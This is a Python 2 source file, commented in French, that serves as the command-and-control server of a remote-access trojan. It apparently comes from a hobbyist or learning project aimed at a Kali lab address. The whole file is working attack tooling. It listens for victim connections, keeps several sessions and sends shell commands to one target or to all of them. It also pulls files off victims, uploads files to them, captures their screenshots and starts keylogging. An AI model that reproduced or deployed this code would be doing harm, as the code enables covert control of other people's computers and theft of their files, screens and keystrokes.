#!/usr/bin/python

import socket
import json
import os
import base64
import threading
import sys, getpass

ipkali = "192.168.1.27"
listening_port = 51234

count = 1 #pour les screenshots


def sendtoall(target,data): #pour envoyer plus de 1024 bits
	json_data = json.dumps(data, ensure_ascii=False)
	target.send(json_data)



def shell(target,ip):


	def reliable_send(data): #pour envoyer plus de 1024 bits
		json_data = json.dumps(data, ensure_ascii=False)
		#print "sending "
		#print json_data
		target.send(json_data)

	def reliable_recv():
		data = "" #empty
		while True:
			try:
				data = data + target.recv(1024)
				#print "data recv"
				#print data.decode('utf-8','ignore')
				#print "json.loads(data)"
				#print json.loads(data.decode('utf-8','ignore'))
				#print "receiving :"
				#print json.loads(data.decode('utf-8'))
				return json.loads(data.decode('utf-8','replace')) #une fois que c bon y a tout dans data
			except ValueError:
				continue #si on recoit plus de 1024 on continue


	global count
	while True:
		command = raw_input("* Shell#~%s: " %str(ip))
		reliable_send(command)
		if command == 'q':
			break
		elif command == "exit": #c'est le exit de la fonction shell, pas celui du command center
			target.close() #on close le socket obj
			targets.remove(target) #on la remove de la liste
			ips.remove(ip) #idem
			break
		elif command[:2] == "cd" and len(command) > 1: #on attend pas de retour
			continue
		elif command[:8] == "download":
			with open(command[9:],"wb") as file: #on open the file to write bytes
				file_data = reliable_recv() #on recv la data dans file_data
				file.write(base64.b64decode(file_data)) #on write la data decodee
		elif command[:6] == "upload":
			try:
				with open(command[7:], "rb") as fin: #read bytes
					print "upload send"
					send = base64.b64encode(fin.read())
					print send
					print "decode"
					print base64.b64decode(send)
					reliable_send(base64.b64encode(send))
			except:
				failed = "Failed to upload"
				reliable_send(base64.b64encode(failed))
		elif command[:10] == "screenshot":
			with open("screenshot%d.png" % count, "wb") as screen: #count va augmenter
				#print "fichier open"
				image = reliable_recv()
				#print image
				image_decoded = base64.b64decode(image)
				#print "image decoded"
				if image_decoded[:4] == "[!!]":
					print(image_decoded) #car c ce qu'on revoie qd il y a une erreur
				else:
					screen.write(image_decoded)
					print("Screenshot shot !")
					count += 1
		elif command[:12] == "keylog_start":
			continue #pour pas bloquer vu que la fonction renvoie rien
		else:
			result = reliable_recv()
			#print "result"
			print(result)

def server():
	global clients
	while True:
		if stop_threads: #si stop_threak on quitte la fonction server
			break
		s.settimeout(1) #permet de pas rester bloque a s.accept
		try:
			target, ip = s.accept() #pas la liste, un seul
			targets.append(target) #on rajoute la nouvelle cible a la liste
			ips.append(ip) #on rajoute la nouvelle ip a la liste
			print(str(targets[clients]) + " --- " + str(ips[clients]) + " has connected !\n")
			clients += 1
			print("* Center: ")
		except:
			pass

global s
ips = [] #va contenir les ips des cibles
targets = [] #va contenir les sockets obj des cibles
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((ipkali, listening_port))
s.listen(5) #on peut accepter 5 connections

clients = 0 #numero d'identification des targets dans la liste
stop_threads = False #juste un flag

print("[+] Waiting for targets to connect...")

t1 = threading.Thread(target=server) #on cree le thread
t1.start()

while True:
	command = raw_input("* Center: ")
	if command == "targets": #on ve regarder les targets connectees
		count = 0
		for ip in ips:
			print("Session " + str(count) + ". <---> " + str(ip))
			count += 1
	elif command[:7] == "session":
		try:
			num = int(command[8]) #numero de session qu'on veut ouvrir
			tarnum = targets[num]
			tarip = ips[num]
			shell(tarnum,tarip) #on ouvre la session
			print("quitte shell")
		except:
			print("[!!] No session under that number !")
	elif command[:7] == "sendall":
		length_of_targets = len(targets) #cmb il y a de sockets obj ds la liste, cmb de PC
		i = 0
		try:
			while i<length_of_targets:
				tarnumber = targets[i]
				ipnumber = ips[i]
				print("'" + str(command[8:]) + "'" + " sent to : " + str(ipnumber))
				sendtoall(tarnumber,command)
				i += 1
		except:
			print("[!!] Failed to send command to all targets")
	elif command == "exit":
		for target in targets:
			target.close() #close les socket obj
		s.close()
		stop_threads = True #on va quitter la while True loop
		t1.join()
		break
	else:
		print("[!!] Command doesn't exist !")
s.close()



















